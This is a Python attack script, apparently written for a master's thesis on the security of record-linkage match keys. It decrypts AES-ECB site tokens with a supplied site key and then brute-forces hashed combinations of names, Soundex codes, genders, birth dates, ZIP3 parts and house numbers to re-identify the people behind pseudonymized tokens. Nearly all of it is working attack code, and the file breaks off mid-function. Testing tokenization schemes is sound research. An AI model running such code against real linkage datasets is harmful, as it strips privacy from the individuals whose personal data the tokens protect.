#!/usr/bin/env python3
"""
Token Escalation Attack Script (Dictionary Mode)
Master Thesis: Record Linkage with Match Key Algorithms - Is it secure?
Author: Babett Müller

Description:
    This script implements a "Dictionary Attack" on encrypted match key tokens.
    It uses a reference dataset (e.g., Voter Registry or synthetic distribution) 
    to re-identify tokens. The attack follows an "Escalation" (pivoting) strategy
    depending on the chosen token paths.

    Key Features:
    - Support for both German ('de') and US ('us') address formats.
    - Configurable "Top-N" dictionary size.
    - Supports multiple token paths: T1, T2, T4, T7, T3, T9.
    - No multiprocessing; single-threaded for easier debugging and tracing.

Usage:
    python3 old_approaches/mult_attack_no_multiprocessing.py --in encrypted_tokens.csv --out results.txt \
        --site-key "KEY" (--master-salt "SALT") --columns "T1,T2,T4,T3,T9"
"""

import argparse
import base64
import csv
import hashlib, hmac
from collections import defaultdict
from datetime import datetime, date
from typing import Dict, Any, Iterable, Tuple, Set, Optional
from jellyfish import soundex
from Crypto.Cipher import AES
import pandas as pd
import time

# ==============================================================================
# CONSTANTS & MAPPINGS
# ==============================================================================

# American Soundex Encoding Map
AM_CODE_MAP = {
    b'b': '1', b'p': '1', b'f': '1', b'v': '1',
    b'c': '2', b's': '2', b'g': '2', b'j': '2', b'k': '2', b'q': '2', b'x': '2', b'z': '2',
    b'd': '3', b't': '3',
    b'l': '4',
    b'm': '5', b'n': '5',
    b'r': '6',
}

# Inverse Map (Digit -> Possible Letters) for Generator
AM_INV_CODE_MAP = {
    '1': [b'b', b'p', b'f', b'v'],
    '2': [b'c', b's', b'g', b'j', b'k', b'q', b'x', b'z'],
    '3': [b'd', b't'],
    '4': [b'l'],
    '5': [b'm', b'n'],
    '6': [b'r'],
}
# Letters that are dropped in Soundex (unless initial)
AM_ZERO_CODE_B = [b'a', b'e', b'i', b'o', b'u', b'y', b'h', b'w']
# -----------------------------------------------------------------

# Full Alphabet for Generator
ALL_ALPHABET_B = [bytes([c]) for c in range(ord('a'), ord('z')+1)]

# Global Counter for Hash Computations
HASHES = 0

# Token Separator
SEP = b"|"

# ==============================================================================
# HELPER FUNCTIONS (NORMALIZATION & HASHING)
# ==============================================================================

def digest_and_count(h):
    """
    Finalizes the hash digest and increments the global hash counter.
    Used to track computational cost of the attack.
    """
    global HASHES
    HASHES += 1
    return h.digest()

def to_bytes_list(xs):
    """
    Converts a list of strings to a list of normalized UTF-8 encoded byte strings,
    filtering out empty or whitespace-only strings.
    """
    return [norm(x).encode("utf-8") for x in xs if str(x).strip()]

def norm(s: Any) -> str:
    """
    Normalizes a string by removing non-alphanumeric characters, whitespace,
    and converting to lowercase.
    Example: "O'Connor" -> "oconnor"
    """
    return "".join(ch for ch in str(s or "").strip().lower() if ch.isalnum())

def norm_gender(g: Any) -> str:
    """
    Standardizes gender/sex input to 'm', 'f', or 'u'.
    """
    g = str(g or "").strip().lower()
    if g in ("m", "male"): return "m"
    if g in ("f", "female"): return "f"
    return "u"

def norm_dob(s: Any) -> str:
    """
    Parses various date string formats and standardizes them to 'YYYYMMDD'.
    Example: "1990-01-01" -> "19900101"
    """
    s = str(s or "").strip()
    fmts = ("%Y-%m-%d", "%d.%m.%Y", "%m/%d/%Y", "%Y/%m/%d", "%Y%m%d")
    for f in fmts:
        try:
            return datetime.strptime(s, f).strftime("%Y%m%d")
        except ValueError:
            pass
    if len(s) == 8 and s.isdigit():
        return s
    return ""

def first_initial(fn: str) -> str:
    """
    Extracts the first character from a first name.
    """
    n = norm(fn)
    return n[0] if n else ""

def first3(fn: str) -> str:
    """
    Extracts the first three characters from a first name.
    """
    n = norm(fn)
    return n[:3] if n else ""

def split_address_b(address: str, lang: str) -> Tuple[bytes, bytes]:
    """
    Splits a raw address string into street name and house number.
    Handles German (Street Number) and US (Number Street) formats differently.
    
    Returns:
        (street_bytes, number_bytes)
    """
    s = (address or "").strip()
    if not s: return b"", b""

    # Clean and tokenize
    parts = s.replace("-", " ").split()
    chunks = ["".join(ch for ch in p.lower() if ch.isalnum()) for p in parts if p]
    if not chunks: return b"", b""

    # US Format: "123 Main St" -> Number first
    if lang == "us":
        if chunks[0] and chunks[0][0].isdigit():
            number = chunks[0].encode()
            street = "".join(chunks[1:]).encode()
            return street, number
        
    # Default / German Format: "Hauptstrasse 123" -> Number last/middle
    num_idx = None
    for i, p in enumerate(chunks):
        if p and p[0].isdigit():
            num_idx = i; break
    if num_idx is None:
        return "".join(chunks).encode(), b""
    street = "".join(chunks[:num_idx]).encode()
    number = "".join(chunks[num_idx:]).encode()
    return street, number

def make_init_hasher(master_salt: bytes | None):
    """
    Factory function that returns a hasher object.
    - If salt is provided: Uses HMAC-SHA256.
    - If salt is None: Uses SHA-256.
    """
    if master_salt is None:
        def init_hasher(prefix=b""):
            h = hashlib.sha256()
            if prefix: h.update(prefix)
            return h
    else:
        def init_hasher(prefix=b""):
            return hmac.new(master_salt, prefix, hashlib.sha256)
    return init_hasher

# ==============================================================================
# PRECOMPUTATION FUNCTIONS
# ==============================================================================

def precompute_dobs(min_year, max_year):
    """
    Generates a list of all valid dates (YYYYMMDD) within the given year range.
    Optimization: Pre-encodes them to bytes to save time in the inner loop.
    """
    dobs = []
    for y in range(min_year, max_year + 1):
        leap = (y % 4 == 0) and (y % 100 != 0 or y % 400 == 0)
        mdays = (31, 29 if leap else 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31)
        for m, dmax in enumerate(mdays, 1):
            for d in range(1, dmax + 1):
                dobs.append(f"{y:04d}{m:02d}{d:02d}".encode("utf-8"))
    return dobs

def precompute_house_numbers(lang: str, max_de=500, max_us=500) -> list:
    """
    Generates a list of common house numbers to brute-force the address token (T9).
    """
    if lang == "de": return [f"{n}".encode("utf-8") for n in range(1, max_de+1)]
    if lang == "us": return [f"{n}".encode("utf-8") for n in range(1, max_us+1)]
    return []

def build_soundex_maps(TOP_FIRST_B, TOP_LAST_B):
    """
    Constructs Reverse Lookup Maps (Indices) for the Dictionary Attack.
    These maps allow O(1) retrieval of candidate names based on their derived features.
    
    Returns:
        FN_BY_INITIAL: Map 'J' -> ['John', 'James'...]
        FN_BY_SDX:     Map 'J500' -> ['John', 'Jon'...]
        LN_BY_SDX:     Map 'S530' -> ['Smith', 'Smyth'...]
        SDX_LAST:      Sorted list of unique Last Name Soundexes
        SDX_FIRST:     Sorted list of unique First Name Soundexes
        ... (byte versions)
    """
    FN_BY_INITIAL = defaultdict(list)
    FN_BY_SDX     = defaultdict(list)
    LN_BY_SDX     = defaultdict(list)
    sdx_last_set  = set()
    sdx_first_set = set()
    for ln_b in TOP_LAST_B:
        if not ln_b: continue
        try: sdx_last = soundex(ln_b.decode("utf-8"))
        except: continue
        if sdx_last:
            sdx_last_set.add(sdx_last)
            LN_BY_SDX[sdx_last].append(ln_b)
    for fn_b in TOP_FIRST_B:
        if not fn_b: continue
        FN_BY_INITIAL[fn_b[:1]].append(fn_b)
        try: sdx_fn = soundex(fn_b.decode("utf-8"))
        except: continue
        if sdx_fn:
            sdx_first_set.add(sdx_fn)
            FN_BY_SDX[sdx_fn].append(fn_b)
    SDX_LAST   = sorted(sdx_last_set)
    SDX_FIRST  = sorted(sdx_first_set)
    SDX_LAST_B  = [c.encode("utf-8") for c in SDX_LAST]
    SDX_FIRST_B = [c.encode("utf-8") for c in SDX_FIRST]
    return FN_BY_INITIAL, FN_BY_SDX, LN_BY_SDX, SDX_LAST, SDX_FIRST, SDX_LAST_B, SDX_FIRST_B

def build_first3_map(first_names_b):
    """
    Builds a map for the T7 Pivot: First 3 Letters -> Full Names.
    Example: b'mar' -> [b'mary', b'martin', b'mark'...]
    """
    m = defaultdict(list)
    for fn in first_names_b:
        if fn: m[fn[:3]].append(fn)
    return m

def precompute_all_soundex_codes() -> Tuple[Set[bytes], Set[bytes]]:
    """
    Generates the theoretical set of ALL valid American Soundex codes (Letter + 3 Digits).
    Used for the Brute-Force Entry on T2 when no dictionary is available.
    """
    initials = [bytes([c]) for c in range(ord('a'), ord('z') + 1)]
    digits = [bytes([c]) for c in b'123456']
    all_sdx_ln, all_sdx_fn = set(), set()
    for initial in initials:
        sdx_prefix = initial.decode().upper().encode()
        all_sdx_ln.add(sdx_prefix + b'000')
        all_sdx_fn.add(sdx_prefix + b'000')
        for d1 in digits:
            all_sdx_ln.add(sdx_prefix + d1 + b'00')
            all_sdx_fn.add(sdx_prefix + d1 + b'00')
            for d2 in digits:
                all_sdx_ln.add(sdx_prefix + d1 + d2 + b'0')
                all_sdx_fn.add(sdx_prefix + d1 + d2 + b'0')
                for d3 in digits:
                    sdx_code = sdx_prefix + d1 + d2 + d3
                    all_sdx_ln.add(sdx_code)
                    all_sdx_fn.add(sdx_code)
    return all_sdx_ln, all_sdx_fn

def generate_soundex_preimages(soundex_code: str, max_length: int) -> Iterable[bytes]:
    """
    Recursive Generator (Brute-Force Engine).
    
    Reverses the Soundex algorithm to generate all possible name strings that map
    to a given Soundex code. Generates all name strings (up to max_length) that match the
    American Soundex code. Only yields "complete" names.
    This version removes memoization to prevent memory crashes.
    
    Args:
        soundex_code: Target code (e.g., "S530")
        max_length: Maximum length of generated names.
        
    Yields:
        Byte strings of candidate names (e.g., b"smith", b"smyth").
    """
    if not soundex_code or not soundex_code[0].isalpha() or len(soundex_code) != 4:
        return
    initial_char_b = soundex_code[0].lower().encode()
    initial_code = AM_CODE_MAP.get(initial_char_b)
    digits_to_match = soundex_code[1:].replace('0', '')
    # memo = set()  

    def _generate(
        current_name_b: bytes,
        last_code_seen: Optional[str],
        remaining_digits: str,
        consecutive_zeros: int,
        in_suffix_mode: bool
    ):
        # state = (current_name_b, ...)  
        # if state in memo: return       
        # memo.add(state)                

        # 1. Suffix Mode: Digits matched, append arbitrary letters up to max_length
        if in_suffix_mode:
            yield current_name_b
        if len(current_name_b) >= max_length:
            return
        if in_suffix_mode:
            for char_b in ALL_ALPHABET_B:
                if len(current_name_b) + len(char_b) <= max_length:
                    yield from _generate(current_name_b + char_b, None, "", 0, True)
            return
        
        # 2. Try appending vowels/separators (Zero Code)
        if consecutive_zeros < 2:
            for char_b in AM_ZERO_CODE_B:
                if len(current_name_b) + len(char_b) <= max_length:
                    yield from _generate(
                        current_name_b + char_b,
                        last_code_seen,
                        remaining_digits,
                        consecutive_zeros + 1,
                        False
                    )

        # 3. Try appending adjacent consonants (Same Code rule)
        if last_code_seen:
            for char_b in AM_INV_CODE_MAP.get(last_code_seen, []):
                 if len(current_name_b) + len(char_b) <= max_length:
                    yield from _generate(
                        current_name_b + char_b,
                        last_code_seen,
                        remaining_digits,
                        0, 
                        False
                    )

        # 4. Try appending new consonants (Next Digit)
        next_digit_to_match = remaining_digits[0] if remaining_digits else None
        if next_digit_to_match:
            for char_b in AM_INV_CODE_MAP.get(next_digit_to_match, []):
                if next_digit_to_match != last_code_seen:
                    if len(current_name_b) + len(char_b) <= max_length:
                        yield from _generate(
                            current_name_b + char_b,
                            next_digit_to_match,
                            remaining_digits[1:],
                            0,
                            False
                        )
        else:
            # Digits exhausted -> Switch to Suffix Mode
            if len(current_name_b) >= 1:
                yield current_name_b
            for char_b in ALL_ALPHABET_B:
                 if len(current_name_b) + len(char_b) <= max_length:
                    yield from _generate(
                        current_name_b + char_b,
                        None, 
                        "",   
                        0,
                        True
                    )
    yield from _generate(initial_char_b, initial_code, digits_to_match, 0, False)

# ==============================================================================
# SITE DECRYPTION & LOADING
# ==============================================================================

def aes128_ecb_decrypt_b64(site_key_16: bytes, token_b64: str) -> bytes:
    """
    Decrypts a base64-encoded AES-128-ECB encrypted token to retrieve the
    intermediate master token hash.
    """
    ct = base64.b64decode(token_b64)
    if len(ct) % 16 != 0: raise ValueError("Ciphertext not multiple of AES block size.")
    cipher = AES.new(site_key_16, AES.MODE_ECB)
    pt = cipher.decrypt(ct)
    return pt

def aes256_ecb_decrypt_b64(site_key_32: bytes, token_b64: str) -> bytes:
    """
    Decrypts a Base64 encoded, AES-256-ECB encrypted site token to retrieve the
    intermediate master token hash.
    """
    ct = base64.b64decode(token_b64)
    if len(ct) % 16 != 0: raise ValueError("Ciphertext not multiple of AES block size.")
    cipher = AES.new(site_key_32, AES.MODE_ECB)
    pt = cipher.decrypt(ct)
    return pt

def parse_bytes(s: str, *, expect_len: Optional[int] = None) -> bytes:
    """
    Helper to parse hex strings or UTF-8 strings into bytes.
    """
    try: b = bytes.fromhex(s)
    except ValueError: b = s.encode("utf-8")
    if expect_len is not None and len(b) != expect_len:
        raise ValueError(f"Expected {expect_len} bytes, got {len(b)}")
    return b

def load_site_tokens(path: str, cols: Iterable[str]) -> Dict[str, list]:
    """
    Reads the CSV file containing the encrypted tokens.
    """
    with open(path, newline="", encoding="utf-8") as f:
        r = csv.DictReader(f)
        rows = list(r)
    return {"_RAW": rows}

def decrypt_columns(rows: list, site_key_32: bytes, colnames: Iterable[str]) -> Dict[str, Set[bytes]]:
    """
    Iterates through the raw CSV rows and decrypts all tokens for the target columns.
    Returns a Set of unique Master Tokens (hashes) for each column type (T1, T2...).
    """
    out: Dict[str, Set[bytes]] = {c: set() for c in colnames}
    successes, failures = 0, 0
    for row in rows:
        for c in colnames:
            val = (row.get(c) or "").strip()
            if not val: continue
            try:
                mt = aes256_ecb_decrypt_b64(site_key_32, val)
                out[c].add(mt)
                successes += 1
            except Exception: failures += 1
    for c in colnames:
        print(f"[decrypt] {c}: unique master tokens={len(out[c])} (successes={successes}, failures={failures})")
    return out

def master_sha256(token_input: str) -> bytes:
    """
    Computes SHA-256 hash of the input string and returns the digest.
    """
    h = hashlib.sha256()
    h.update(token_input.encode("utf-8"))
    return digest_and_count(h)

def master_hmac(master_salt: bytes, token_input: str) -> bytes:
    """
    Computes HMAC-SHA256 of the input string using the provided master salt.
    """
    h = hmac.new(master_salt, token_input.encode("utf-8"), hashlib.sha256)
    return digest_and_count(h)

# ==============================================================================
# ATTACK FUNCTIONS (CORE LOGIC)
# ==============================================================================

# ==============================================================================
# ATTACK FUNCTIONS (CORE LOGIC)
# ==============================================================================

def attack_T1_fast(master_tokens, lastnames_b, initials_b, dobs_b, init_hasher):
    """
    Pivot:          Brute-force T1 (ln|fi|g|dob) directly from last names, initials and dobs.
    Strategy:       Iterate through all combinations of last names, first initials, genders, and dobs.
    Complexity:     O(LastNames * 26 * 3 * DOBs)
    
    Returns:
        Map { master_token: (ln, fi, g, dob) }
    """
    hits = {}
    for ln in lastnames_b:                  
        h_ln = init_hasher(ln + SEP)              # H(ln|)
        for fi in initials_b:                 
            h_fi = h_ln.copy(); h_fi.update(fi); h_fi.update(SEP)    # H(ln|fi|)
            for g in SEX_B:
                h_sig = h_fi.copy(); h_sig.update(g); h_sig.update(SEP)  # H(ln|fi|g|)
                for dob in dobs_b:              
                    h = h_sig.copy(); h.update(dob)  # H(ln|fi|g|dob)
                    mt = digest_and_count(h)
                    if mt in master_tokens:
                        hits[mt] = (ln, fi, g, dob)
    return hits

def attack_T1_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher):
    """
    Pivot:          Recover T1 (ln|fi|g|dob) candidates from a T2 hit (sdx_ln|sdx_fn|g|dob).
    Strategy:       Use LN_BY_SDX (Dictionary) or a Soundex Generator to map the known 
                    Last Name Soundex code back to candidate Last Name strings.
                    Derive the First Initial (fi) directly from the first character of the 
                    First Name Soundex (sdx_fn), as Soundex preserves the initial.
                    Test the resulting T1 candidates.
    Complexity:     O(Candidate_Last_Names)
                    (Much faster than attack_T1_fast because we only check relevant names)
    
    Returns:
        Map { master_token: (ln, fi, g, dob) }
    """
    hits = {}
    contains = master_tokens.__contains__
    try:
        sdx_ln_str = sdx_ln_b.decode("utf-8")
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception:
        return hits
    
    # 1. Generate all Last Name candidates from Soundex
    cand_last_names = list(generate_soundex_preimages(sdx_ln_str, max_length=15))

    # Get initial first name from soundex code
    fi_b = sdx_fn_str[:1].lower().encode("utf-8")

    if not cand_last_names:
        return hits
    for ln_b in cand_last_names:
        h_ln = init_hasher(ln_b + SEP)                              # H(ln|)
        h_fi = h_ln.copy(); h_fi.update(fi_b); h_fi.update(SEP)        # H(ln|fi|)
        h_g  = h_fi.copy(); h_g.update(g_b); h_g.update(SEP)          # H(ln|fi|g|)
        h_final = h_g.copy(); h_final.update(dob_b)                 # H(ln|fi|g|dob)
        mt = digest_and_count(h_final)
        if contains(mt):
            hits[mt] = (ln_b, fi_b, g_b, dob_b)
    return hits

def attack_T2_fast(master_tokens, SDX_LAST_B, SDX_FIRST_B, dobs_b, init_hasher):
    """
    Pivot:          Brute-force T2 (sdx_ln|sdx_fn|g|dob) by iterating Soundex codes.
    Strategy:       Instead of iterating names, iterate the smaller space of Soundex codes 
                    (derived from a dictionary or exhaustively generated).
    Complexity:     O(Unique_Sdx_Last * Unique_Sdx_First * 3 * DOBs)
    
    Returns:
        Map { master_token: (sdx_ln, sdx_fn, g, dob) }
    """
    hits = {}
    contains = master_tokens.__contains__
    for sdx_ln in SDX_LAST_B:                       # b"X123"
        h_ln = init_hasher(sdx_ln + SEP)            # H(sdx_ln|)
        for sdx_fn in SDX_FIRST_B:
            h_fn = h_ln.copy(); h_fn.update(sdx_fn); h_fn.update(SEP)      # H(sdx_ln|sdx_fn|)
            for g in SEX_B:
                h_sig = h_fn.copy(); h_sig.update(g); h_sig.update(SEP)      # H(...|g|)
                for dob in dobs_b:
                    h = h_sig.copy(); h.update(dob)                   # H(...|dob)
                    mt = digest_and_count(h)
                    if contains(mt):
                        hits[mt] = (sdx_ln, sdx_fn, g, dob)
    return hits

def attack_T2_via_T1(master_tokens, SDX_FIRST, ln_b, fi_b, g_b, dob_b, last_to_sdx, init_hasher):
    """
    Pivot:          Recover T2 candidates from a known T1 hit (ln|fi|g|dob).
    Strategy:       We already know the exact Last Name (ln), so we compute its Soundex directly.
                    We know the First Initial (fi), so we filter the candidate First Name 
                    Soundex codes to only those starting with that initial.
                    Test the resulting T2 candidates.
    Complexity:     O(Candidate_First_Soundexes) -> Usually very small (< 100 codes per initial)
    
    Returns:
        Map { master_token: (sdx_ln, sdx_fn, g, dob) }
    """
    hits = {}
    contains = master_tokens.__contains__
    sdx_ln = last_to_sdx.get(ln_b)
    if not sdx_ln:
        try:
            sdx_ln = soundex(ln_b.decode("utf-8"))
        except Exception:
            return hits
    if not sdx_ln:
        return hits
    sdx_ln_b = sdx_ln.encode("utf-8")
    initial_upper = fi_b[:1].decode(errors="ignore").upper()
    if not initial_upper:
        return hits
    cand_sdx_first = [code for code in SDX_FIRST if code and code[0] == initial_upper]
    if not cand_sdx_first:
        return hits
    cand_sdx_first_b = [c.encode("utf-8") for c in cand_sdx_first]
    h_ln = init_hasher(sdx_ln_b + SEP)
    for sdx_fn_b in cand_sdx_first_b:
        h_fn = h_ln.copy(); h_fn.update(sdx_fn_b); h_fn.update(SEP)
        h_g  = h_fn.copy(); h_g.update(g_b); h_g.update(SEP)
        h_final = h_g.copy(); h_final.update(dob_b)
        mt = digest_and_count(h_final)
        if contains(mt):
            hits[mt] = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
    return hits

def attack_T7_via_T1(master_tokens, ln_b, fi_b, g_b, dob_b, init_hasher):
    """
    Pivot:          Recover T7 (ln|fi3|g|dob) from a known T1 hit (ln|fi|g|dob).
    Strategy:       We know the first initial (fi). T7 requires the first 3 letters (fi3).
                    We brute-force the 2nd and 3rd letters (a-z) to generate all possible 
                    3-letter prefixes starting with `fi`.
    Complexity:     O(26 * 26) = O(676) per T1 hit.
    
    Returns:
        Map { master_token: (ln, fi3, g, dob) }
    """
    hits = {}
    contains = master_tokens.__contains__
    if not fi_b or len(fi_b) != 1:
        return hits  # need exactly one-byte initial
    # Prefix hash: H(ln|)
    h_ln = init_hasher(ln_b + SEP)
    letters = range(ord('a'), ord('z') + 1)
    for c2 in letters:
        for c3 in letters:
            fi3_b = fi_b + bytes([c2, c3])
            # H(ln|fi3|)
            h_fi3 = h_ln.copy(); h_fi3.update(fi3_b); h_fi3.update(SEP)
            # H(ln|fi3|g|)
            h_sig = h_fi3.copy(); h_sig.update(g_b); h_sig.update(SEP)
            # H(ln|fi3|g|dob)
            h_final = h_sig.copy(); h_final.update(dob_b)
            mt = digest_and_count(h_final)
            if contains(mt):
                hits[mt] = (ln_b, fi3_b, g_b, dob_b)
    return hits

def attack_T7_via_T2_T1(master_tokens, ln_b, sdx_fn_b, g_b, dob_b, FN_BY_SDX, init_hasher):
    """
    Pivot:          Recover T7 (ln|fi3|g|dob) using intersection of T1 (provides ln) 
                    and T2 (provides sdx_fn).
    Strategy:       Use the First Name Soundex from T2 to lookup candidate First Names 
                    in the dictionary (FN_BY_SDX). Extract their 3-letter prefixes (fi3) 
                    and test them with the known Last Name from T1.
    Complexity:     O(Candidate_First_Names_for_Soundex)
    
    Returns:
        Map { master_token: (ln, fi3, g, dob) }
    """
    hits = {}
    contains = master_tokens.__contains__
    try:
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception:
        return hits
    cand_first_names = FN_BY_SDX.get(sdx_fn_str, [])
    if not cand_first_names:
        return hits
    h_ln = init_hasher(ln_b + SEP)  # H(ln|)
    for fn_b in cand_first_names:
        if len(fn_b) < 1:
            continue
        fi3_b = fn_b[:3]  # no padding
        h_fi3 = h_ln.copy(); h_fi3.update(fi3_b); h_fi3.update(SEP)
        h_sig = h_fi3.copy(); h_sig.update(g_b); h_sig.update(SEP)
        h_final = h_sig.copy(); h_final.update(dob_b)
        mt = digest_and_count(h_final)
        if contains(mt):
            hits[mt] = (ln_b, fi3_b, g_b, dob_b)
    return hits

def attack_T7_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, init_hasher):
    """
    Pivot:          Recover T7 (ln|fi3|g|dob) purely from T2 (sdx_ln|sdx_fn|g|dob).
    Strategy:       Brute-force/Generate all candidate Last Names from `sdx_ln`.
                    Brute-force/Generate all candidate First Names from `sdx_fn` (length 3).
                    Test the Cartesian product of these candidates against T7.
    Complexity:     O(Cand_Last_Names * Cand_First_Name_Prefixes)
    
    Returns:
        Map { master_token: (ln, fi3, g, dob) }
    """
    hits = {}
    contains = master_tokens.__contains__
    try:
        sdx_ln_str = sdx_ln_b.decode("utf-8")
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception:
        return hits
    
    # Brute-force all compatible last/first names from Soundex
    cand_last_names = list(generate_soundex_preimages(sdx_ln_str, max_length=15))
    # Only need first names up to length 3 for fi3
    cand_first_names = list(generate_soundex_preimages(sdx_fn_str, max_length=3))

    if not cand_last_names or not cand_first_names:
        return hits
    for ln_b in cand_last_names:
        h_ln = init_hasher(ln_b + SEP)
        for fi3_b in cand_first_names:
            if not fi3_b:
                continue
            # We only care about fi3, so we only test names of length 1, 2, or 3
            if len(fi3_b) > 3:
                continue # Generator yields prefixes, so 'maxi' might appear
                         # We only want 'm', 'ma', 'max'
            
            h_fi3 = h_ln.copy(); h_fi3.update(fi3_b); h_fi3.update(SEP)
            h_sig = h_fi3.copy(); h_sig.update(g_b); h_sig.update(SEP)
            h_final = h_sig.copy(); h_final.update(dob_b)
            mt = digest_and_count(h_final)
            if contains(mt):
                hits[mt] = (ln_b, fi3_b, g_b, dob_b)
    return hits

def attack_T7_via_T2T1(master_tokens, ln_b, sdx_fn_b, g_b, dob_b, init_hasher):
    """
    Pivot:          Recover T7 (ln|fi3|g|dob) from intersection of T1 (provides ln) and T2 (provides sdx_fn).
    Strategy:       Similar to attack_T7_via_T2, but we skip generating Last Names because
                    we already know `ln` from T1. We only generate First Name prefixes 
                    consistent with `sdx_fn`.
    Complexity:     O(Cand_First_Name_Prefixes)
    
    Returns:
        Map { master_token: (ln, fi3, g, dob) }
    """
    hits = {}
    contains = master_tokens.__contains__
    try:
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception:
        return hits
        
    # Brute-force all compatible first names from Soundex
    cand_first_names = list(generate_soundex_preimages(sdx_fn_str, max_length=3))

    if not cand_first_names:
        return hits
    
    h_ln = init_hasher(ln_b + SEP)
    for fi3_b in cand_first_names:
        if not fi3_b:
            continue
        if len(fi3_b) > 3:
            continue
            
        h_fi3 = h_ln.copy(); h_fi3.update(fi3_b); h_fi3.update(SEP)
        h_sig = h_fi3.copy(); h_sig.update(g_b); h_sig.update(SEP)
        h_final = h_sig.copy(); h_final.update(dob_b)
        mt = digest_and_count(h_final)
        if contains(mt):
            hits[mt] = (ln_b, fi3_b, g_b, dob_b)
    return hits

def pivot_to_T4_fast(master_tokens, FN_BY_INITIAL, FN_BY_SDX, t1_hit, t2_hit, init_hasher):
    """
    Pivot:          Recover T4 (ln|fn|g|dob) using constraints from T1 (fi) and T2 (sdx_fn).
    Strategy:       Filter the dictionary of First Names.
                    1. Must start with the Initial (fi) from T1.
                    2. If T2 hit is available, must also match the Soundex (sdx_fn) from T2.
                    This intersection drastically reduces the candidate pool.
    Complexity:     O(Filtered_First_Names)
    
    Returns:
        Map { master_token: (ln, fn, g, dob) }
    """
    ln, fi, g, dob = t1_hit
    contains = master_tokens.__contains__
    cand_fns = FN_BY_INITIAL.get(fi[:1], [])
    if t2_hit is not None:
        sdx_code = t2_hit[1]
        if isinstance(sdx_code, bytes):
            sdx_code = sdx_code.decode('utf-8', 'ignore')
        pool = FN_BY_SDX.get(sdx_code, [])
        if pool:
            pool_set = set(pool)
            cand_fns = [fn for fn in cand_fns if fn in pool_set]
        else:
            cand_fns = []
    h_ln = init_hasher(ln + SEP)
    hits = {}
    for fn in cand_fns:
        h_fn = h_ln.copy(); h_fn.update(fn); h_fn.update(SEP); h_fn.update(g); h_fn.update(SEP)
        h = h_fn.copy(); h.update(dob)
        mt = digest_and_count(h)
        if contains(mt):
            hits[mt] = (ln, fn, g, dob)
    return hits

def pivot_to_T4_via_T7(master_tokens, ln_b, fi3_b, g_b, dob_b, FIRST3_MAP,init_hasher):
    """
    Pivot:          Recover T4 (ln|fn|g|dob) from T7 (ln|fi3|g|dob).
    Strategy:       We know the Last Name and the first 3 letters (fi3) of the First Name.
                    Use a map `FIRST3_MAP` (fi3 -> [full_names]) to retrieve all dictionary 
                    names that start with this 3-letter prefix.
                    Test these candidates against T4.
    Complexity:     O(Dictionary_Names_with_Prefix) -> Typically very small (< 5)
    
    Returns:
        Map { master_token: (ln, fn, g, dob) }
    """
    hits = {}
    contains = master_tokens.__contains__
    # Candidate first names: exact 3-byte prefix match
    # fi3_b = b"max" can map to multiple full names (e.g. b"max", b"maximilian")
    prefix = fi3_b[:3]
    cand_fns = FIRST3_MAP.get(prefix, [])
    if not cand_fns:
        return hits
    h_ln = init_hasher(ln_b + SEP)  # H(ln|)
    for fn_b in cand_fns:
        h_fn = h_ln.copy(); h_fn.update(fn_b); h_fn.update(SEP); h_fn.update(g_b); h_fn.update(SEP)
        h = h_fn.copy(); h.update(dob_b)
        mt = digest_and_count(h)
        if contains(mt):
            hits[mt] = (ln_b, fn_b, g_b, dob_b)  # bytes
    return hits

def pivot_to_T4_via_T7_T2(master_tokens, sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher):
    """
    Pivot:          Recover T4 (ln|fn|g|dob) from T7 (fi3) + T2 (sdx_ln, sdx_fn).
    Strategy:       Used in Pure Brute-Force mode (no dictionary).
                    1. Generate Last Names from `sdx_ln`.
                    2. Generate First Names from `sdx_fn`.
                    3. Filter First Names: Must start with `fi3`.
                    Test combinations against T4.
    Complexity:     O(Cand_Last_Names * Filtered_First_Names)
    
    Returns:
        Map { master_token: (ln, fn, g, dob) }
    """
    hits = {}
    contains = master_tokens.__contains__
    try:
        sdx_ln_str = sdx_ln_b.decode("utf-8")
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception:
        return hits
    
    # 1. Generate all Last Name candidates from Soundex
    cand_last_names = list(generate_soundex_preimages(sdx_ln_str, max_length=15))
    # 2. Generate all First Name candidates from Soundex
    cand_first_names = list(generate_soundex_preimages(sdx_fn_str, max_length=10))

    if not cand_last_names or not cand_first_names:
        return hits
    h_gob = init_hasher(SEP); h_gob.update(g_b); h_gob.update(SEP); h_gob.update(dob_b)
    for ln_b in cand_last_names:
        h_ln = init_hasher(ln_b + SEP)
        for fn_b in cand_first_names:
            # Check if fn_b matches fi3_b prefix
            if not fn_b.startswith(fi3_b):
                continue
            h_fn = h_ln.copy(); h_fn.update(fn_b); h_fn.update(SEP)
            h_sig = h_fn.copy(); h_sig.update(g_b); h_sig.update(SEP)
            h_final = h_sig.copy(); h_final.update(dob_b)
            mt = digest_and_count(h_final)
            if contains(mt):
                hits[mt] = (ln_b, fn_b, g_b, dob_b)
    return hits

def pivot_to_T3_fast(master_tokens, ln_b, fn_b, dob_b, init_hasher):
    """
    Pivot:      T3 <-- T4 (using known Last Name + First Name + DOB to get candidate ZIP3 parts).
    Strategy:   Use known Last Name, First Name, and DOB to generate candidate ZIP3 parts,
                then test T3 candidates.
    Complexity: O(Candidates)

    Returns:
        Map { master_token: (ln, fn, dob, zip3) }
    """
    contains = master_tokens.__contains__
    h0 = init_hasher(ln_b + SEP + fn_b + SEP + dob_b + SEP)
    hits = {}
    for zpart in ZIP3_PARTS:
        h = h0.copy(); h.update(zpart)
        mt = digest_and_count(h)
        if contains(mt): hits[mt] = (ln_b, fn_b, dob_b, zpart)
    return hits

def pivot_to_T9_fast(master_tokens, fn_b, address_list_raw, lang, exclude_house_numbers, HOUSE_NUMBERS, init_hasher):
    """
    Pivot:      T9 <-- T4 (using known First Name to get candidate addresses).
    Strategy:   Use known First Name and address list to generate candidate addresses,
                then test T9 candidates.
    Complexity: O(Candidates)

    Returns:
        Map { master_token: (fn, address) }
    """
    contains = master_tokens.__contains__
